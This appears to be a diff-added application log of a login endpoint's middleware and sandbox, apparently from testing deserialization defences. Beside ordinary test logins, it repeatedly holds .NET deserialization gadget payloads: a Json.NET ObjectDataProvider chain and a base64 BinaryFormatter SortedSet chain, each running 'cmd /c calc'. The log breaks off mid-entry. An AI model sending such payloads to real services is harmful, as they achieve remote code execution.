+2025-06-24 17:08:11: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-24 17:08:20: Sandbox received payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-24 17:08:51: Deserialized object with TypeNameHandling.None: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-24 17:09:26: Raw JSON: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-24 17:25:19: Middleware read payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-24 17:25:19: Sandbox received payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-24 17:25:19: Deserialized object with TypeNameHandling.None: {
+  "username": "admin",
+  "password": "admin123"
+}
+2025-06-24 17:25:19: Successfully decoded base64 for password: i٢�]�
+2025-06-24 17:25:20: Raw JSON: {
+  "username": "admin",
+  "password": "i٢�]�"
+}
+2025-06-24 17:25:20: Username: admin, Password: i٢�]�
+2025-06-24 17:25:24: Middleware read payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-24 17:25:24: Sandbox received payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-24 17:25:24: Deserialized object with TypeNameHandling.None: {
+  "username": "admin",
+  "password": "admin123"
+}
+2025-06-24 17:25:24: Successfully decoded base64 for password: i٢�]�
+2025-06-24 17:25:24: Raw JSON: {
+  "username": "admin",
+  "password": "i٢�]�"
+}
+2025-06-24 17:25:24: Username: admin, Password: i٢�]�
+2025-06-24 17:25:28: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-24 17:25:28: Sandbox received payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-24 17:25:28: Deserialized object with TypeNameHandling.None: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-24 17:25:28: Raw JSON: {
+  "username": {
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {}
+  },
+  "password": "dummy"
+}
+2025-06-24 17:25:28: Username: {
+  "MethodName": "Start",
+  "MethodParameters": {
+    "$values": [
+      "cmd",
+      "/c calc"
+    ]
+  },
+  "ObjectInstance": {}
+}, Password: dummy
+2025-06-25 11:09:34: Middleware read payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-25 11:09:34: Sandbox received payload: {
+    "username": "admin",
+    "password": "admin123"
+}
+2025-06-25 11:09:34: Deserialized object with TypeNameHandling.None: {
+  "username": "admin",
+  "password": "admin123"
+}
+2025-06-25 11:09:34: Raw JSON: {
+  "username": "admin",
+  "password": "admin123"
+}
+2025-06-25 11:09:34: Username: admin, Password: admin123
+2025-06-25 11:09:45: Middleware read payload: {
+    "username": "tung2",
+    "password": "1"
+}
+2025-06-25 11:09:45: Sandbox received payload: {
+    "username": "tung2",
+    "password": "1"
+}
+2025-06-25 11:09:45: Deserialized object with TypeNameHandling.None: {
+  "username": "tung2",
+  "password": "1"
+}
+2025-06-25 11:09:45: Raw JSON received: {
+  "username": "tung2",
+  "password": "1"
+}
+2025-06-25 11:09:47: Middleware read payload: {
+    "username": "tung2",
+    "password": "1"
+}
+2025-06-25 11:09:47: Sandbox received payload: {
+    "username": "tung2",
+    "password": "1"
+}
+2025-06-25 11:09:47: Deserialized object with TypeNameHandling.None: {
+  "username": "tung2",
+  "password": "1"
+}
+2025-06-25 11:09:47: Raw JSON received: {
+  "username": "tung2",
+  "password": "1"
+}
+2025-06-25 11:09:52: Middleware read payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-25 11:09:52: Sandbox received payload: {
+    "username": {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+        "MethodName": "Start",
+        "MethodParameters": {
+            "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+            "$values": [
+                "cmd",
+                "/c calc"
+            ]
+        },
+        "ObjectInstance": {
+            "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+        }
+    },
+    "password": "dummy" 
+}
+2025-06-25 11:09:52: Deserialized object with TypeNameHandling.None: {
+  "username": {
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {
+      "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+    }
+  },
+  "password": "dummy"
+}
+2025-06-25 11:09:52: Raw JSON: {
+  "username": {
+    "MethodName": "Start",
+    "MethodParameters": {
+      "$values": [
+        "cmd",
+        "/c calc"
+      ]
+    },
+    "ObjectInstance": {}
+  },
+  "password": "dummy"
+}
+2025-06-25 11:09:52: Username: {
+  "MethodName": "Start",
+  "MethodParameters": {
+    "$values": [
+      "cmd",
+      "/c calc"
+    ]
+  },
+  "ObjectInstance": {}
+}, Password: dummy
+2025-06-25 11:09:57: Middleware read payload: {
+    "username": "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAsvYyBjYWxjLmV4ZQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL",
+    "password": "1"
+}
+2025-06-25 11:09:57: Sandbox received payload: {
+    "username": "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAsvYyBjYWxjLmV4ZQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL",
+    "password": "1"
+}
+2025-06-25 11:09:57: Deserialized object with TypeNameHandling.None: {
+  "username": "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAsvYyBjYWxjLmV4ZQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL",
+  "password": "1"
+}
+2025-06-25 11:09:57: Successfully decoded base64 for username:     ����          ISystem, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089   �System.Collections.Generic.SortedSet`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]   CountComparerVersionItems  �System.Collections.Generic.ComparisonComparer`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]      	      	      �System.Collections.Generic.ComparisonComparer`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]   _comparison"System.DelegateSerializationHolder	            /c calc.exe   cmd   "System.DelegateSerializationHolder   Delegatemethod0method10System.DelegateSerializationHolder+DelegateEntry/System.Reflection.MemberInfoSerializationHolder/System.Reflection.MemberInfoSerializationHolder	   		   	
+      0System.DelegateSerializationHolder+DelegateEntry   typeassemblytargettargetTypeAssemblytargetTypeName
+methodNamedelegateEntry0System.DelegateSerializationHolder+DelegateEntry   �System.Func`3[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]   Kmscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
+   ISystem, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089   System.Diagnostics.Process   Start	   	   /System.Reflection.MemberInfoSerializationHolder   NameAssemblyName	ClassName	Signature
+Signature2
+MemberTypeGenericArguments System.Type[]	   	   	      >System.Diagnostics.Process Start(System.String, System.String)   >System.Diagnostics.Process Start(System.String, System.String)   
+
+   	      Compare	      System.String   +Int32 Compare(System.String, System.String)   2System.Int32 Compare(System.String, System.String)   
+         qSystem.Comparison`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]	   
+	   	   	   
+
+2025-06-25 11:09:57: Raw JSON received: {
